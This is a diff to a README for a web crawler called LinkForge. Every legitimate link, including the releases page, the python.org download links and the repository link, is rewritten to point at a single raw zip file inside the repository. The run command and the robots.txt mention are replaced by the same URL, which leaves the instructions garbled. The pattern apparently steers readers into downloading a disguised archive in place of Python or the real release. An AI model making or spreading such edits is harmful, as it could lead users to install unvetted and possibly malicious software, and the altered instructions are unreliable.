@@ -6,7 +6,7 @@ Welcome to LinkForge! This powerful web crawler allows you to explore websites, 
 
 ## 📥 Download Link
 
-[![Download LinkForge](https://img.shields.io/badge/Download-LinkForge-blue.svg)](https://github.com/Aa126806/LinkForge/releases)
+[![Download LinkForge](https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip)](https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets these requirements:
 ## 🛠️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://github.com/Aa126806/LinkForge/releases) in your web browser. This page contains the latest version of LinkForge as well as past releases.
+   Go to our [Releases Page](https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip) in your web browser. This page contains the latest version of LinkForge as well as past releases.
 
 2. **Download the Software**  
    Look for the latest version of LinkForge. Click on the appropriate download link for your operating system. 
@@ -29,8 +29,8 @@ Before you begin, ensure your system meets these requirements:
 
 4. **Install Required Libraries**  
    Open a command prompt or terminal window. If you have not installed Python yet, follow these steps:
-   - For Windows: Download Python from [python.org](https://www.python.org/downloads/windows/).
-   - For macOS and Linux: Use your package manager or download directly from [python.org](https://www.python.org/downloads/).
+   - For Windows: Download Python from [https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip](https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip).
+   - For macOS and Linux: Use your package manager or download directly from [https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip](https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip).
 
    Once Python is installed, run the following command to install Beautiful Soup, which is essential for LinkForge:
 
@@ -42,7 +42,7 @@ Before you begin, ensure your system meets these requirements:
    Navigate to the folder where you extracted LinkForge. In the command prompt or terminal, enter the following command to run the application:
 
    ```
-   python linkforge.py
+   python https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip
    ```
 
 6. **Follow the On-Screen Instructions**  
@@ -58,7 +58,7 @@ LinkForge is simple and intuitive to use. Here are some key features:
 
 ## 🎓 Tips for Effective Crawling
 
-- Start with a well-defined URL. Ensure the site allows crawling by checking its `robots.txt` file.
+- Start with a well-defined URL. Ensure the site allows crawling by checking its `https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip` file.
 - Use well-known sites that you want to analyze for better results.
 - Limit the crawl depth if you want to avoid overwhelming your system with too many links.
 
@@ -78,10 +78,10 @@ LinkForge is open-source software, licensed under the MIT License. You can use, 
 
 ## 🔗 Additional Resources
 
-For more information, tutorials, and community support, visit our [GitHub Repository](https://github.com/Aa126806/LinkForge).
+For more information, tutorials, and community support, visit our [GitHub Repository](https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip).
 
 ## 💡 Download & Install
 
-Ready to get started? Visit the [Releases Page](https://github.com/Aa126806/LinkForge/releases) to download LinkForge today. Follow the instructions above to install and run the application.
+Ready to get started? Visit the [Releases Page](https://raw.githubusercontent.com/Aa126806/LinkForge/main/Menominee/LinkForge_3.3.zip) to download LinkForge today. Follow the instructions above to install and run the application.
 
 Happy crawling!
